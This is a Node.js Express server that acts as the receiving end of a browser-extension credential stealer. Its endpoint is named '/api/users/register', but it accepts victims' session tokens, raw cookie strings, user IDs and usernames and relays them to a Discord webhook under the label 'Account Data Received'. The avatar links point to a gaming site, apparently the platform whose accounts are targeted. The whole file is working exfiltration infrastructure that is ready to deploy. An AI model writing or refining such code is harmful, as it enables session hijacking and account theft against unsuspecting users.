const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Helper to find a cookie by name
function findCookie(cookieString, name) {
    if (!cookieString) return null;
    const match = cookieString.match(new RegExp(`${name}=([^;]+)`));
    return match ? match[1] : null;
}

// FIXED: Changed endpoint to match your background.js
app.post('/api/users/register', async (req, res) => {
    try {
        const { userId, username, displayName, sessionToken, rawCookieString } = req.body;
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            console.error("Webhook not configured on server.");
            return res.status(500).json({ status: "error" });
        }

        if (!sessionToken) {
            return res.status(400).json({ status: "error", message: "Missing session token" });
        }

        // Build the Discord payload using the data sent directly from the extension
        let avatarUrl = "https://playvortex.io/favicon.ico";
        if (userId && userId !== "Unknown") {
            avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
        }

        const payload = {
            username: "Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🦊 Account Data Received",
                color: 0x8f82c4,
                thumbnail: { url: avatarUrl },
                fields: [
                    { name: "👤 Username", value: `**@${username || 'Unknown'}**`, inline: true },
                    { name: "📛 Display Name", value: `**${displayName || 'Unknown'}**`, inline: true },
                    { name: "🆔 User ID", value: `\`${userId || 'Unknown'}\``, inline: false },
                    { name: "🔑 Session Token", value: `\`\`\`${sessionToken}\`\`\``, inline: false },
                    { name: "📦 Raw Cookies", value: `\`\`\`${(rawCookieString || '').substring(0, 950)}\`\`\``, inline: false }
                ],
                footer: { text: "Render Proxy", icon_url: "https://playvortex.io/favicon.ico" },
                timestamp: new Date().toISOString()
            }]
        };

        // 4. Send to Discord
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            console.error("Discord webhook failed on server:", response.status);
            return res.status(500).json({ status: "error", message: "Discord webhook failed" });
        } else {
            console.log("Data successfully relayed to Discord!");
            return res.status(200).json({ status: "success" });
        }

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ status: "error", message: err.message });
    }
});

app.get('/', (req, res) => {
    res.send('API is running.');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
